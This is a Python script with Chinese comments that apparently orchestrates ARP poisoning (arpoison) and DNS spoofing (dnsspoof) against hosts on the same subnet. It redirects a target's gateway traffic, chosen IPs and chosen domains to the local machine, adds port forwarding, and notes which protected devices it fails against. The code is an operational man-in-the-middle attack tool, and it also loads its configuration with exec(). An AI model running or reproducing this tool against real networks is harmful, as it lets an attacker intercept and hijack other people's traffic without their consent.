# -*- coding: utf-8 -*-

"""
1)  只适用于同网段 (本地对应的网卡和对应目标在同一个网段)  , 对安装360的PC(启动网络保护)和安卓机测试无效,   虚拟机似乎必须是同一个server下
2)  安装   arpoison   ,  dnsspoof    :  yum install dsniff 

config.py   基本配置文件 
(注意以下文件名可配)
dns 转发配置文件  (转发到本地, 支持#注释):  		dnspoof.config(dnsfile)		格式:  每行一个域名  www.abc.com			效果: 对指定域名的请求转发到本地
ip  转发配置文件 (同网段转发到本地, 支持#注释):  	ipspoof.config(ipfile)			格式:  每行一个IP 192.168.1.200				效果: 对同网段指定IP的请求转发到本地
本地端口转发配置文件 (本地两个端口之间, 支持#注释):	portredirect.config(portfile)		格式:  每行一个转发 80 48000				效果: 对到本地80地址的请求,转发到本地48000

"""

import os,sys
from sys import argv
import codecs

import traceback

import time


####

sys.path.append(sys.path[0] + "/modules/")    #python 2.7 对   modules.  的方式兼容不好
from getinfo import *   ## 用于获得基础信息
from shows import *   ## 用于显示
from dns import * ## 用于域名转发
from ips import *  ## 用于 ip 转发
from ports import * ## 用于 端口本地转发


### 屏幕即时控制  --已经弃用

"""
import curses
stdscr = curses.initscr()
curses.noecho()
curses.cbreak()   ## 输入不需换行
curses.start_color()
curses.init_pair(1, curses.COLOR_BLUE, curses.COLOR_BLACK)
curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
COLORS1=curses.color_pair(1)
COLORS2=curses.color_pair(2)
COLORS3=curses.color_pair(3)
"""



####  进行转发

def cheatit(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs):

	#### ARP 方案

	###  arpoison  模式对网关
	cheatsarpoisonGateway(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)

	#  arpspoof  模式对网关  ---暂未使用
	#cheatsarpspoofGateway(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)

	### arpoison  模式对IP
	tocheatarpIP(device,ip,localmacs,ipfile)


	#### DNS 方案

	## dnsspoof
	cheatdnsspoof(device,localips,dnsfile)

	#### 端口转发方案
	portdirect(portfile)
	
	#### 桩方案

	# 只要在本地 port2 上使用其他的动态接口框架就可以了



####   恢复网络状态

def resetnetwork(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs):

	#### ARP

	cmd= "killall -q arpoison"
	os.system(cmd) 

	cmd= "killall -q arpspoof"
	os.system(cmd) 

	#### DNS
	cmd= "killall -q dnsspoof"
	os.system(cmd) 

	#### 端口转发清空
	portdirect(portfile,1)   ## 清空操作

	#### 所有临时文件
	cmd= "rm -f *.temp"
	os.system(cmd) 	

	
	"""  不能进行以下恢复操作, 会造成实施的本地设备网络出现问题   ---- 原DNS转发部分中的网关ARP重定向

	cmd="arpoison -i "  + device +" -d "  + ip + " -s " + gatewayips +"  -t " + remotemacs +" -r " +gatewaymacs + " -n 2"
	#print(cmd)
	os.system(cmd)  

	cmd="arpoison -i "  + device +" -d "  + gatewayips + " -s " + ip +"  -t " + gatewaymacs +" -r " +remotemacs + " -n 2"
	#print(cmd)
	os.system(cmd) 


	cmd="arping -I " + device + " " + ip +" -c 2"
	os.system(cmd) 

	cmd="arping -I " + device +" " + gatewayips +" -c 2"
	os.system(cmd) 

	"""


##############################

if __name__ == "__main__":

	"""   不再使用参数    (老参数样例)
	## 目标ip   参数1  
	ip=argv[1].replace("\n","")


	"""

	### 获得配置文件环境变量
	device=None

	configfile="config.py"
	(string,lines)=openfiles(configfile)

	exec(string)


	### 自动获得与目标地址同网段的设备名
	device=localdevice(ip) 


	#########################

	if device=="" and device is not None:
		print("Network error:  arp can't reached target from any device")

	else:
		#### 自动获得各个所需的MAC及IP
		#print("select device: " + device)

		localips=localip(device)
		localmacs=localmac(device)
		gatewayips=getgateway(device)
		gatewaymacs=getgatewaymac(device)
		remotemacs=getremotemac(ip)

		###############

		## 先重置
		resetnetwork(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)  

		## 原方法  弃用
		#lastselect=1
		#stats="running"     #  用于显示当前状态

		try:
			cheatit(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)
			showredir(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs,dnsfile,ipfile,portfile)

			#### 循环

			while 1:  
				pass

				""" 
				#原方法   受限太大  弃用
				## 即时选择启动
				selectredir(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs,stats,stdscr,dnsfile,ipfile,portfile):

				c = stdscr.getch()
				if c == ord('1')  and lastselect!=1:
					cheatit(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)
					lastselect=1	
					stats="running"  

				elif c == ord('2') and lastselect!=2:
					resetnetwork(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)
					lastselect=2
					stats="stop"

				elif c == ord('9'):
					break  # Exit the while()

				"""

		except:
			pass
						

		### 恢复状态  如 ctrl+c

		#原显示方法重置
		"""
		curses.endwin() 
		"""

		cmd= "reset"  
		os.system(cmd)

		print("\nReset the network.")
		resetnetwork(device,ip,gatewayips,remotemacs,gatewaymacs,localmacs)
		print("OK")

		traceback.print_exc()





	
	






